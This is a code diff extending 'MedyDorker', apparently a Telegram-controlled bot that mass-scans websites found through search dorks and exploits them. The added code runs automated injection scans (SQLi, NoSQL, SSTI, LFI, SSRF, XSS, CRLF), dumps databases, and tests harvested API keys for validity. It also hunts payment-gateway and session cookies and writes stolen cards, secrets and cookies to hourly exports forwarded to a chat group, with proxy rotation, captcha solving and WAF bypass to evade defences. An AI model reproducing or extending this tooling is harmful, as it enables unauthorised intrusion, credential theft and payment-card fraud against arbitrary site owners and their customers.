+                                        hint_dbms=dbms,
+                                    )
+                                    if union_result and union_result.rows_extracted > 0:
+                                        result["dumps"].append({
+                                            "type": f"union_{dbms}",
+                                            "dbms": union_result.dbms,
+                                            "tables": union_result.total_tables,
+                                            "rows": union_result.rows_extracted,
+                                            "version": union_result.version,
+                                            "user": union_result.current_user,
+                                            "database": union_result.current_db,
+                                        })
+                                        await self.reporter.report_data_dump(
+                                            sqli_entry.get("source_url", url),
+                                            union_result.dbms,
+                                            union_result.current_db,
+                                            list(union_result.tables.keys()),
+                                            {t: len(cols) for t, cols in union_result.tables.items()},
+                                            [],
+                                        )
+                                except Exception as e:
+                                    logger.debug(f"Multi-DBMS union dump failed: {e}")
+
+                    # Step 10: API Key Validation on discovered secrets (v3.13)
+                    if self.key_validator and result.get("secrets"):
+                        try:
+                            keys_to_validate = []
+                            for s in result["secrets"]:
+                                detected = self.key_validator.detect_keys(s.get("value", ""))
+                                keys_to_validate.extend(detected)
+                            
+                            if keys_to_validate:
+                                batch = await self.key_validator.validate_and_report(
+                                    keys_to_validate, url, session,
+                                )
+                                if batch:
+                                    result["key_validations"] = [
+                                        {
+                                            "key_type": v.key_type,
+                                            "is_live": v.is_live,
+                                            "confidence": v.confidence,
+                                            "risk_level": v.risk_level,
+                                            "display_key": v.display_key,
+                                        }
+                                        for v in batch.results
+                                    ]
+                        except Exception as e:
+                            logger.debug(f"Key validation failed: {e}")
+
+                    # Step 10b: ML filter on discovered secrets (v3.14)
+                    if self.ml_filter and result.get("secrets"):
+                        filtered_secrets = []
+                        for s in result["secrets"]:
+                            secret_match = {
+                                "url": url,
+                                "type": s.get("type", ""),
+                                "value": s.get("value", ""),
+                                "confidence": 0.8,
+                                "key_name": s.get("name", ""),
+                                "category": s.get("category", ""),
+                            }
+                            try:
+                                fr = self.ml_filter.filter_secret(secret_match=secret_match)
+                                if fr.is_positive:
+                                    s["ml_confidence"] = fr.confidence
+                                    filtered_secrets.append(s)
+                                else:
+                                    logger.debug(f"🧠 ML filter rejected secret {s.get('type')} on {url}")
+                            except Exception as e:
+                                logger.debug(f"ML filter secret error: {e}")
+                                filtered_secrets.append(s)  # Keep on error
+                        result["secrets"] = filtered_secrets
+
+                    # ══════════════════════════════════════════════════════
+                    # Steps 11-18: Extended Vulnerability Scanners (v3.17)
+                    # ══════════════════════════════════════════════════════
+
+                    # Step 11: XSS Testing
+                    if self.xss_scanner:
+                        try:
+                            xss_results = await self.xss_scanner.scan(url, session, waf_name=waf_name)
+                            if xss_results:
+                                result["xss"] = [
+                                    {"param": r.parameter, "type": r.xss_type, "context": r.context,
+                                     "payload": r.payload_used[:80], "confidence": r.confidence}
+                                    for r in xss_results
+                                ]
+                                for xr in xss_results:
+                                    await self.reporter.send_message(
+                                        f"🎯 <b>XSS Found!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{xr.parameter}</code>\n"
+                                        f"Type: {xr.xss_type} | Context: {xr.context}\n"
+                                        f"Confidence: {xr.confidence:.0%}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"XSS scan error: {e}")
+
+                    # Step 12: SSTI Testing
+                    if self.ssti_scanner:
+                        try:
+                            ssti_results = await self.ssti_scanner.scan(url, session, waf_name=waf_name)
+                            if ssti_results:
+                                result["ssti"] = [
+                                    {"param": r.parameter, "engine": r.engine, "rce": r.rce_confirmed,
+                                     "payload": r.payload_used[:80], "confidence": r.confidence}
+                                    for r in ssti_results
+                                ]
+                                for sr in ssti_results:
+                                    await self.reporter.send_message(
+                                        f"🔥 <b>SSTI Found!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{sr.parameter}</code>\n"
+                                        f"Engine: {sr.engine} | RCE: {'YES' if sr.rce_confirmed else 'No'}\n"
+                                        f"Confidence: {sr.confidence:.0%}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"SSTI scan error: {e}")
+
+                    # Step 13: NoSQL Injection Testing
+                    if self.nosql_scanner:
+                        try:
+                            nosql_results = await self.nosql_scanner.scan(url, session, waf_name=waf_name)
+                            if nosql_results:
+                                result["nosql"] = [
+                                    {"param": r.parameter, "type": r.nosql_type, "db": r.db_type,
+                                     "auth_bypass": r.auth_bypass, "confidence": r.confidence}
+                                    for r in nosql_results
+                                ]
+                                for nr in nosql_results:
+                                    await self.reporter.send_message(
+                                        f"🍃 <b>NoSQL Injection!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{nr.parameter}</code>\n"
+                                        f"DB: {nr.db_type} | Type: {nr.nosql_type}\n"
+                                        f"Auth Bypass: {'YES' if nr.auth_bypass else 'No'}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"NoSQL scan error: {e}")
+
+                    # Step 13b: NoSQL Dump (auto_dumper blind extraction after NoSQL injection)
+                    if (self.auto_dumper and result.get("nosql") and
+                            getattr(self.config, 'auto_dump_nosql', True)):
+                        try:
+                            nosql_parsed = await self.auto_dumper.nosql_dump(
+                                url, nosql_results, session
+                            )
+                            if nosql_parsed and nosql_parsed.total_rows > 0:
+                                result["dumps"].append({
+                                    "source": "nosql_blind",
+                                    "rows": nosql_parsed.total_rows,
+                                    "creds": len(nosql_parsed.credentials),
+                                    "secrets": len(nosql_parsed.secrets),
+                                    "emails": len(nosql_parsed.emails),
+                                })
+                        except Exception as e:
+                            logger.debug(f"NoSQL dump error: {e}")
+
+                    # Step 14: LFI / Path Traversal Testing
+                    if self.lfi_scanner:
+                        try:
+                            lfi_results = await self.lfi_scanner.scan(url, session, waf_name=waf_name)
+                            if lfi_results:
+                                result["lfi"] = [
+                                    {"param": r.parameter, "type": r.lfi_type, "file": r.file_read,
+                                     "os": r.os_detected, "confidence": r.confidence}
+                                    for r in lfi_results
+                                ]
+                                for lr in lfi_results:
+                                    await self.reporter.send_message(
+                                        f"📂 <b>LFI/Path Traversal!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{lr.parameter}</code>\n"
+                                        f"File: {lr.file_read} | OS: {lr.os_detected}\n"
+                                        f"Type: {lr.lfi_type} | Confidence: {lr.confidence:.0%}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"LFI scan error: {e}")
+
+                    # Step 15: SSRF Testing
+                    if self.ssrf_scanner:
+                        try:
+                            ssrf_results = await self.ssrf_scanner.scan(url, session, waf_name=waf_name)
+                            if ssrf_results:
+                                result["ssrf"] = [
+                                    {"param": r.parameter, "type": r.ssrf_type,
+                                     "target": r.target_reached, "cloud": r.cloud_provider,
+                                     "confidence": r.confidence}
+                                    for r in ssrf_results
+                                ]
+                                for sr in ssrf_results:
+                                    await self.reporter.send_message(
+                                        f"🌐 <b>SSRF Found!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{sr.parameter}</code>\n"
+                                        f"Target: {sr.target_reached}\n"
+                                        f"{'Cloud: ' + sr.cloud_provider if sr.cloud_provider else ''}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"SSRF scan error: {e}")
+
+                    # Step 16: CORS Misconfiguration Testing
+                    if self.cors_scanner:
+                        try:
+                            cors_results = await self.cors_scanner.scan(url, session, waf_name=waf_name)
+                            if cors_results:
+                                result["cors"] = [
+                                    {"type": r.cors_type, "origin": r.payload_origin,
+                                     "acao": r.acao_header, "creds": r.acac_header}
+                                    for r in cors_results
+                                ]
+                                for cr in cors_results:
+                                    await self.reporter.send_message(
+                                        f"🔓 <b>CORS Misconfig!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Type: {cr.cors_type}\n"
+                                        f"ACAO: {cr.acao_header} | Creds: {cr.acac_header}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"CORS scan error: {e}")
+
+                    # Step 17: Open Redirect Testing
+                    if self.redirect_scanner:
+                        try:
+                            redir_results = await self.redirect_scanner.scan(url, session, waf_name=waf_name)
+                            if redir_results:
+                                result["redirects"] = [
+                                    {"param": r.parameter, "type": r.redirect_type,
+                                     "final_url": r.final_url[:80]}
+                                    for r in redir_results
+                                ]
+                                for rr in redir_results:
+                                    await self.reporter.send_message(
+                                        f"↪️ <b>Open Redirect!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{rr.parameter}</code>\n"
+                                        f"Redirects to: {rr.final_url[:60]}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"Redirect scan error: {e}")
+
+                    # Step 18: CRLF Injection Testing
+                    if self.crlf_scanner:
+                        try:
+                            crlf_results = await self.crlf_scanner.scan(url, session, waf_name=waf_name)
+                            if crlf_results:
+                                result["crlf"] = [
+                                    {"param": r.parameter, "type": r.crlf_type,
+                                     "header": r.injected_header}
+                                    for r in crlf_results
+                                ]
+                                for cr in crlf_results:
+                                    await self.reporter.send_message(
+                                        f"💉 <b>CRLF Injection!</b>\n"
+                                        f"URL: <code>{url[:80]}</code>\n"
+                                        f"Param: <code>{cr.parameter}</code>\n"
+                                        f"Injected: {cr.injected_header}"
+                                    )
+                        except Exception as e:
+                            logger.debug(f"CRLF scan error: {e}")
+
                     # Record scan in DB
                     findings_count = len(result.get("secrets", [])) + len(result.get("sqli", []))
+                    findings_count += sum(len(result.get(k, [])) for k in ("xss", "ssti", "nosql", "lfi", "ssrf", "cors", "redirects", "crlf"))
                     self.db.add_scan_record(url, "auto", findings_count)
                     
                     # Reset circuit breaker on success
@@ -592,6 +1428,28 @@ class MedyDorkerPipeline:
                 findings.append(f"{len(result['dumps'])} dumps")
             if result.get("cookies", {}).get("b3"):
                 findings.append(f"B3 cookies")
+            # Cookie Hunter results
+            hunt = result.get("cookie_hunt", {})
+            if hunt.get("b3"):
+                findings.append(f"{len(hunt['b3'])} B3 traced")
+            if hunt.get("gateway"):
+                gws = set(g.get("gateway", "?") for g in hunt["gateway"])
+                findings.append(f"{len(hunt['gateway'])} gateway cookies ({', '.join(gws)})")
+            if hunt.get("detected_gateways"):
+                findings.append(f"gateways: {', '.join(hunt['detected_gateways'])}")
+            # Recursive crawl results
+            crawl = result.get("crawl", {})
+            if crawl.get("pages_fetched"):
+                findings.append(
+                    f"crawled {crawl['pages_fetched']}pg d{crawl['max_depth']} "
+                    f"({crawl['param_urls']} params)"
+                )
+            # Extended vuln scanner results (v3.17)
+            for vkey, vlabel in [("xss", "XSS"), ("ssti", "SSTI"), ("nosql", "NoSQL"),
+                                  ("lfi", "LFI"), ("ssrf", "SSRF"), ("cors", "CORS"),
+                                  ("redirects", "Redirect"), ("crlf", "CRLF")]:
+                if result.get(vkey):
+                    findings.append(f"{len(result[vkey])} {vlabel}")
             
             if findings:
                 findings_counter.append(1)
@@ -769,15 +1627,25 @@ class MedyDorkerPipeline:
         
         logger.info("🚀 MedyDorker v3.0 Starting...")
         
+        # Start proxy manager (load files, health check, background tasks)
+        if self.proxy_manager:
+            await self.proxy_manager.start(initial_health_check=self.config.proxy_health_check)
+            if self.proxy_manager.has_proxies:
+                logger.info(f"🔄 Proxies: {self.proxy_manager.alive_count}/{self.proxy_manager.total} alive")
+        
         # Generate dorks in thread to avoid blocking event loop
         dork_count = await asyncio.to_thread(
             lambda: len(self.generator.generate_all(50000))
         )
         
         # Send startup notification
+        proxy_status = "Disabled"
+        if self.proxy_manager and self.proxy_manager.has_proxies:
+            proxy_status = f"{self.proxy_manager.alive_count}/{self.proxy_manager.total} alive"
         await self.reporter.report_startup({
             "Dorks Available": dork_count,
             "Engines": ", ".join(self.config.engines),
+            "Proxies": proxy_status,
             "SQLi": "Enabled" if self.config.sqli_enabled else "Disabled",
             "Dumper": "Enabled" if self.config.dumper_enabled else "Disabled",
             "WAF Detection": "Enabled" if self.config.waf_detection_enabled else "Disabled",
@@ -789,8 +1657,9 @@ class MedyDorkerPipeline:
             f"Generating dorks and starting cycle..."
         )
         
-        # Start status reporter
+        # Start status reporter and hourly export
         status_task = asyncio.create_task(self._status_loop())
+        export_task = asyncio.create_task(self._export_loop())
         
         try:
             cycle = 0
@@ -816,6 +1685,9 @@ class MedyDorkerPipeline:
             await self.reporter.report_error(str(e), "main pipeline")
         finally:
             status_task.cancel()
+            export_task.cancel()
+            # Write final export on shutdown
+            await self._write_export()
             self._save_state()
             if hasattr(self, 'db'):
                 self.db.close()
@@ -826,6 +1698,9 @@ class MedyDorkerPipeline:
         """Stop the pipeline."""
         self.running = False
         self._save_state()
+        # Stop proxy manager background tasks
+        if self.proxy_manager:
+            await self.proxy_manager.stop()
         logger.info("Pipeline stop requested")
 
     async def _status_loop(self):
@@ -853,6 +1728,159 @@ class MedyDorkerPipeline:
             except Exception as e:
                 logger.error(f"Status loop error: {e}")
 
+    async def _export_loop(self):
+        """Export a .txt report every hour with all findings."""
+        while self.running:
+            try:
+                await asyncio.sleep(3600)  # Every 1 hour
+                if self.running:
+                    filepath = await self._write_export()
+                    if filepath:
+                        await self._send_progress(
+                            f"📁 <b>Hourly Export Saved</b>\n"
+                            f"<code>{os.path.basename(filepath)}</code>\n"
+                            f"SQLi: {len(self.vulnerable_urls)} | "
+                            f"Secrets: {len(self.found_secrets)} | "
+                            f"Gateways: {len(self.found_gateways)} | "
+                            f"Cards: {len(self.found_cards)}"
+                        )
+                        # Also send to report group
+                        if self._report_chat_id:
+                            await self._send_to_report_group(
+                                f"📁 <b>Hourly Export #{self._export_counter}</b>\n"
+                                f"⏱ Uptime: {self.get_stats().get('uptime', 'N/A')}\n"
+                                f"URLs scanned: {self.urls_scanned}\n"
+                                f"🔓 SQLi: {len(self.vulnerable_urls)}\n"
+                                f"🔐 Secrets: {len(self.found_secrets)}\n"
+                                f"🔑 Gateways: {len(self.found_gateways)}\n"
+                                f"💳 Cards: {len(self.found_cards)}\n"
+                                f"File: <code>{os.path.basename(filepath)}</code>"
+                            )
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                logger.error(f"Export loop error: {e}")
+
+    async def _write_export(self) -> Optional[str]:
+        """Write a comprehensive .txt export of all findings."""
+        self._export_counter += 1
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"dorker_export_{ts}.txt"
+        filepath = os.path.join(self._export_dir, filename)
+        
+        stats = self.get_stats()
+        
+        lines = []
+        lines.append("=" * 70)
+        lines.append(f"  MedyDorker v3.15 — Hourly Export #{self._export_counter}")
+        lines.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        lines.append(f"  Uptime: {stats.get('uptime', 'N/A')}")
+        lines.append("=" * 70)
+        lines.append("")
+        
+        # — Summary —
+        lines.append("--- SUMMARY ---")
+        lines.append(f"Cycles completed: {self.cycle_count}")
+        lines.append(f"URLs scanned: {self.urls_scanned}")
+        lines.append(f"Domains seen: {len(self.seen_domains)}")
+        lines.append(f"SQLi vulns: {len(self.vulnerable_urls)}")
+        lines.append(f"Secrets found: {len(self.found_secrets)}")
+        lines.append(f"Gateways found: {len(self.found_gateways)}")
+        lines.append(f"Cards found: {len(self.found_cards)}")
+        lines.append(f"Cookies: {stats.get('cookies_total', 0)} (B3: {stats.get('b3_cookies', 0)})")
+        lines.append("")
+        
+        # — Vulnerable URLs (SQLi) —
+        if self.vulnerable_urls:
+            lines.append("--- VULNERABLE URLs (SQLi) ---")
+            for v in self.vulnerable_urls:
+                url = v.get('url', 'N/A')
+                param = v.get('param', v.get('parameter', '?'))
+                technique = v.get('technique', v.get('type', '?'))
+                dbms = v.get('dbms', '?')
+                lines.append(f"  [{technique}/{dbms}] param={param}")
+                lines.append(f"    {url}")
+            lines.append("")
+        
+        # — Secrets —
+        if self.found_secrets:
+            lines.append("--- SECRETS ---")
+            for s in self.found_secrets:
+                stype = s.get('type', 'unknown')
+                value = s.get('value', '')[:80]
+                source = s.get('url', s.get('source', 'N/A'))
+                lines.append(f"  [{stype}] {value}")
+                lines.append(f"    Source: {source}")
+            lines.append("")
+        
+        # — Gateways —
+        if self.found_gateways:
+            lines.append("--- GATEWAYS ---")
+            for g in self.found_gateways:
+                url = g.get('url', 'N/A')
+                gtype = g.get('type', g.get('gateway', '?'))
+                lines.append(f"  [{gtype}] {url}")
+            lines.append("")
+        
+        # — Cards —
+        if self.found_cards:
+            lines.append("--- CARDS ---")
+            for c in self.found_cards:
+                card = c if isinstance(c, str) else c.get('card', str(c))
+                lines.append(f"  {card}")
+            lines.append("")
+        
+        # — B3 Cookies —
+        try:
+            b3_cookies = self.db.get_b3_cookies()
+            if b3_cookies:
+                lines.append("--- B3 COOKIES ---")
+                for bc in b3_cookies:
+                    lines.append(f"  {bc.get('name', '?')}={bc.get('value', '?')[:60]}")
+                    lines.append(f"    Domain: {bc.get('domain', '?')}")
+                lines.append("")
+        except Exception:
+            pass
+        
+        # — All Scanned Domains —
+        if self.seen_domains:
+            lines.append("--- SCANNED DOMAINS ---")
+            for d in sorted(self.seen_domains):
+                lines.append(f"  {d}")
+            lines.append("")
+        
+        # — Port Scan Results —
+        try:
+            port_scans = self.db.get_port_scans(limit=500)
+            if port_scans:
+                lines.append("--- PORT SCANS ---")
+                by_domain = {}
+                for ps in port_scans:
+                    dom = ps.get('domain', '?')
+                    if dom not in by_domain:
+                        by_domain[dom] = []
+                    by_domain[dom].append(ps)
+                for dom, ports in sorted(by_domain.items()):
+                    open_ports = [f"{p.get('port', '?')}/{p.get('service', '?')}" for p in ports]
+                    lines.append(f"  {dom}: {', '.join(open_ports)}")
+                lines.append("")
+        except Exception:
+            pass
+        
+        lines.append("=" * 70)
+        lines.append(f"  End of export — {len(lines)} lines")
+        lines.append("=" * 70)
+        
+        try:
+            with open(filepath, 'w') as f:
+                f.write("\n".join(lines))
+            logger.info(f"Hourly export written: {filepath} ({len(lines)} lines)")
+            self._last_export_time = datetime.now()
+            return filepath
+        except Exception as e:
+            logger.error(f"Export write failed: {e}")
+            return None
+
     def get_stats(self) -> Dict:
         """Get current statistics including DB stats."""
         uptime = ""
@@ -870,16 +1898,24 @@ class MedyDorkerPipeline:
             except Exception:
                 pass
         
+        # Use DB counts (persisted) with in-memory as fallback
+        gw_count = self.db.get_gateway_count() if hasattr(self, 'db') else len(self.found_gateways)
+        sec_count = self.db.get_secret_count() if hasattr(self, 'db') else len(self.found_secrets)
+        vuln_count = self.db.get_vuln_count() if hasattr(self, 'db') else len(self.vulnerable_urls)
+        card_count = self.db.get_card_count() if hasattr(self, 'db') else len(self.found_cards)
+        scan_count = db_stats.get("scans", self.urls_scanned)
+        domain_count = db_stats.get("domains", len(self.seen_domains))
+        
         return {
             "running": self.running,
             "uptime": uptime,
             "cycles": self.cycle_count,
-            "urls_scanned": self.urls_scanned,
-            "seen_domains": len(self.seen_domains),
-            "gateways_found": len(self.found_gateways),
-            "secrets_found": len(self.found_secrets),
-            "sqli_vulns": len(self.vulnerable_urls),
-            "cards_found": len(self.found_cards),
+            "urls_scanned": max(self.urls_scanned, scan_count),
+            "seen_domains": max(len(self.seen_domains), domain_count),
+            "gateways_found": gw_count,
+            "secrets_found": sec_count,
+            "sqli_vulns": vuln_count,
+            "cards_found": card_count,
             "cookies_total": db_stats.get("cookies", 0),
             "b3_cookies": db_stats.get("b3_cookies", 0),
             "blocked_domains": len(self.db.get_blocked_domains()) if hasattr(self, 'db') else 0,
@@ -906,7 +1942,7 @@ def get_pipeline() -> MedyDorkerPipeline:
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command."""
     text = (
-        "🔥 <b>MedyDorker v3.1</b> 🔥\n"
+        "🔥 <b>MedyDorker v3.14</b> 🔥\n"
         "\n"
         "<b>Full Exploitation Pipeline:</b>\n"
         "Dorker → Scanner → Exploiter → Dumper → Reporter\n"
@@ -920,17 +1956,45 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/sqlistats — SQLi stats\n"
         "/secrets — Found secrets/keys\n"
         "/cookies — Show extracted cookies (b3/session)\n"
+        "/cookiehunt &lt;url&gt; — Hunt B3 + gateway cookies\n"
         "/dumps — Data dumps\n"
         "/categories — Dork categories\n"
         "/target &lt;cat&gt; — Targeted scan\n"
         "/scan &lt;url&gt; — Scan single URL\n"
         "/deepscan &lt;url&gt; — Deep scan URL\n"
+        "/mass url1 url2 ... — Mass scan up to 25 URLs\n"
+        "/authscan &lt;url&gt; cookies — Authenticated scan behind login\n"
+        "/setgroup — Set this chat as findings report group\n"
+        "/export — Export all findings to .txt now\n"
+        "/firecrawl — Firecrawl engine status\n"
+        "/captcha — Captcha solver status &amp; balance\n"
+        "/proxy — Proxy pool status &amp; health\n"
+        "/browser — Headless browser engine stats\n"
+        "/ecom — E-commerce checker stats\n"
+        "/crawlstats — Recursive crawler stats\n"
+        "/ports — Port scanner stats\n"
+        "/oob — OOB SQLi injector stats\n"
+        "/unionstats — Multi-DBMS union dumper stats\n"
+        "/keys — API key validator stats\n"
+        "/mlfilter — ML false positive filter stats\n"
         "\n"
-        "<b>Features (v3.1):</b>\n"
+        "<b>Features (v3.14):</b>\n"
         "• 50K+ dynamic dorks (XDumpGO-style)\n"
-        "• 8 search engines with health tracking\n"
+        "• 🔥 Firecrawl: Search + Scrape + Crawl (JS rendering)\n"
+        "• 🧩 Auto captcha solving (2captcha/NopeCHA/AntiCaptcha)\n"
+        "• 🔄 Smart proxy rotation (1150+ proxies, health checks)\n"
+        "• 🌐 Headless browser fallback (Playwright/Chromium)\n"
+        "• 🛍️ E-commerce platform checker (Shopify/WC/Magento/PS/OC)\n"
+        "• 🕸️ Recursive BFS crawler (depth control + priority queue)\n"
+        "• 🔍 Port scanner (80+ ports, banner grab, service detection)\n"
+        "• 📡 OOB SQLi injector (DNS/HTTP exfiltration, interact.sh)\n"
+        "• 🗃️ Multi-DBMS union dumper (MySQL/MSSQL/PgSQL/Oracle/SQLite)\n"
+        "• 🔑 API key validator (16 key types, live validation)\n"
+        "• 🧠 ML false positive filter (gradient boosted trees)\n"
+        "• 8+ search engines with health tracking\n"
         "• WAF/CDN detection (60+ sigs) + bypass payloads\n"
         "• SQLi: URL + Cookie + Header + POST injection\n"
+        "• 👁‍🗨 Blind SQLi dumping (boolean + time-based)\n"
         "• 🔵 B3 distributed tracing cookie extraction\n"
         "• Concurrent URL processing (semaphore)\n"
         "• Smart param prioritization + dork scoring\n"
@@ -939,6 +2003,13 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• DIOS data extraction + card dumping\n"
         "• Real-time Telegram reporting\n"
         "• ✅ Concurrent: /scan works while dorking\n"
+        "• 📤 Report group forwarding (/setgroup)\n"
+        "• 📁 Hourly .txt export (auto + /export)\n"
+        "• ☁️ FlareSolverr CF bypass (auto-fallback)\n"
+        "• 🔬 JS Bundle Analyzer (SPA/Next.js endpoint extraction)\n"
+        "• 🔨 API Endpoint Bruteforcer (auth bypass + GraphQL)\n"
+        "• 🌐 Playwright SPA Rendering (React/Vue/Angular DOM)\n"
+        "• 🔐 Authenticated scanning (/authscan + cookies)\n"
     )
     await update.message.reply_text(text, parse_mode="HTML")
 
@@ -1091,12 +2162,104 @@ async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 for name, value in cookies.items():
                     text += f"    {name}: <code>{value[:40]}</code>\n"
     
+    # Cookie Hunter stats
+    if hasattr(p, 'cookie_hunter') and p.cookie_hunter:
+        text += f"\n{p.cookie_hunter.get_stats_text()}\n"
+    
+    # E-commerce checker stats
+    if hasattr(p, 'ecom_checker') and p.ecom_checker:
+        text += f"\n{p.ecom_checker.get_stats_text()}\n"
+    
     if len(text) > 4000:
         parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
         for part in parts:
             await update.message.reply_text(part, parse_mode="HTML")
     else:
         await update.message.reply_text(text, parse_mode="HTML")
+
+
+async def cmd_cookiehunt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /cookiehunt <url> command — actively hunt a URL for B3 + gateway cookies."""
+    p = get_pipeline()
+    
+    if not p.cookie_hunter:
+        await update.message.reply_text("❌ Cookie Hunter is not enabled. Set cookie_hunter_enabled=True in config.")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text(
+            "🍪 <b>Cookie Hunter</b>\n\n"
+            "Usage: <code>/cookiehunt &lt;url&gt;</code>\n\n"
+            "Actively probes the URL for:\n"
+            "  🔵 B3 distributed tracing cookies/headers\n"
+            "  🏦 Payment gateway cookies (Stripe, Braintree, PayPal, etc.)\n"
+            "  🛒 Commerce/checkout cookies\n"
+            "  🔍 Gateway SDK detection in HTML\n"
+            "  📡 Checkout page probing\n\n"
+            "Or use <code>/cookiehunt stats</code> for hunt statistics.",
+            parse_mode="HTML",
+        )
+        return
+    
+    if args[0].lower() == "stats":
+        text = p.cookie_hunter.get_stats_text()
+        await update.message.reply_text(text, parse_mode="HTML")
+        return
+    
+    url = args[0]
+    if not url.startswith("http"):
+        url = f"https://{url}"
+    
+    await update.message.reply_text(f"🍪 Hunting cookies at <code>{url[:80]}</code>...", parse_mode="HTML")
+    
+    try:
+        result = await p.cookie_hunter.hunt_and_report(url)
+        
+        text = f"🍪 <b>Cookie Hunt Results</b>\n\n"
+        text += f"<b>URL:</b> <code>{url[:80]}</code>\n"
+        text += f"<b>Probe time:</b> {result.probing_time:.1f}s\n\n"
+        
+        if result.b3_finds:
+            text += f"🔵 <b>B3 Tracing ({len(result.b3_finds)}):</b>\n"
+            for f in result.b3_finds:
+                text += f"  <code>{f.cookie_name}</code> = <code>{f.display_value}</code> [{f.source}]\n"
+            text += "\n"
+        
+        if result.gateway_finds:
+            text += f"🏦 <b>Gateway Cookies ({len(result.gateway_finds)}):</b>\n"
+            for f in result.gateway_finds:
+                text += f"  [{f.gateway.upper()}] <code>{f.cookie_name}</code> = <code>{f.display_value}</code>\n"
+            text += "\n"
+        
+        if result.commerce_finds:
+            text += f"🛒 <b>Commerce Cookies ({len(result.commerce_finds)}):</b>\n"
+            for f in result.commerce_finds:
+                text += f"  <code>{f.cookie_name}</code> = <code>{f.display_value}</code>\n"
+            text += "\n"
+        
+        if result.detected_gateways:
+            text += f"🔍 <b>Gateway SDKs in HTML:</b> {', '.join(g.upper() for g in result.detected_gateways)}\n"
+        
+        if result.checkout_pages:
+            text += f"📡 <b>Checkout pages found:</b> {len(result.checkout_pages)}\n"
+            for cp in result.checkout_pages[:5]:
+                text += f"  → <code>{cp[:80]}</code>\n"
+        
+        if result.total_finds == 0 and not result.detected_gateways:
+            text += "No B3, gateway, or commerce cookies found.\n"
+        
+        if result.error:
+            text += f"\n⚠️ Error: {result.error}\n"
+        
+        if len(text) > 4000:
+            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
+            for part in parts:
+                await update.message.reply_text(part, parse_mode="HTML")
+        else:
+            await update.message.reply_text(text, parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Cookie hunt error: {e}")
 
 
 async def cmd_dorkstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1123,60 +2286,87 @@ async def cmd_dorkstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_sqlistats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /sqlistats command."""
+    """Handle /sqlistats command — reads from DB (persists across restarts)."""
     p = get_pipeline()
+    
+    # Read from DB for persistence
+    db_vulns = p.db.get_vulnerable_urls(limit=15) if hasattr(p, 'db') else []
+    vuln_count = p.db.get_vuln_count() if hasattr(p, 'db') else len(p.vulnerable_urls)
     
     text = (
         f"🔓 <b>SQLi Statistics</b>\n"
         f"\n"
-        f"<b>Total Vulns Found:</b> {len(p.vulnerable_urls)}\n"
+        f"<b>Total Vulns Found:</b> {vuln_count}\n"
         f"\n"
     )
     
-    if p.vulnerable_urls:
-        text += "<b>Recent Vulnerabilities:</b>\n"
-        for vuln in p.vulnerable_urls[-10:]:
+    if db_vulns:
+        # Count by type
+        type_counts = {}
+        for v in db_vulns:
+            t = v.get('injection_type', v.get('type', 'unknown'))
+            type_counts[t] = type_counts.get(t, 0) + 1
+        text += "<b>By Type:</b> "
+        text += " | ".join(f"{t}: {c}" for t, c in type_counts.items())
+        text += "\n\n<b>Recent Vulnerabilities:</b>\n"
+        for vuln in db_vulns[:10]:
             text += (
-                f"\n<code>{vuln['url'][:60]}</code>\n"
-                f"  Param: {vuln['param']} | Type: {vuln['type']} | DBMS: {vuln['dbms']}\n"
+                f"\n<code>{vuln.get('url', '?')[:60]}</code>\n"
+                f"  Param: {vuln.get('parameter', vuln.get('param', '?'))} | "
+                f"Type: {vuln.get('injection_type', vuln.get('type', '?'))} | "
+                f"DBMS: {vuln.get('dbms', '?')}\n"
             )
     else:
         text += "No SQLi vulnerabilities found yet."
+    
+    if len(text) > 4000:
+        text = text[:3990] + "\n\n<i>... truncated</i>"
     
     await update.message.reply_text(text, parse_mode="HTML")
 
 
 async def cmd_secrets(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /secrets command."""
+    """Handle /secrets command — reads from DB (persists across restarts)."""
     p = get_pipeline()
     
-    text = f"🔐 <b>Found Secrets</b> ({len(p.found_gateways)} gateways, {len(p.found_secrets)} other)\n\n"
+    # Read from DB (persisted) not in-memory (lost on restart)
+    db_gateways = p.db.get_gateway_keys(limit=20) if hasattr(p, 'db') else []
+    db_secrets = p.db.get_secrets(limit=20) if hasattr(p, 'db') else []
+    gw_count = p.db.get_gateway_count() if hasattr(p, 'db') else len(p.found_gateways)
+    sec_count = p.db.get_secret_count() if hasattr(p, 'db') else len(p.found_secrets)
     
-    if p.found_gateways:
+    text = f"🔐 <b>Found Secrets</b> ({gw_count} gateways, {sec_count} other)\n\n"
+    
+    if db_gateways:
         text += "<b>🔑 Gateway Keys:</b>\n"
-        for gw in p.found_gateways[-15:]:
+        for gw in db_gateways[:15]:
             text += (
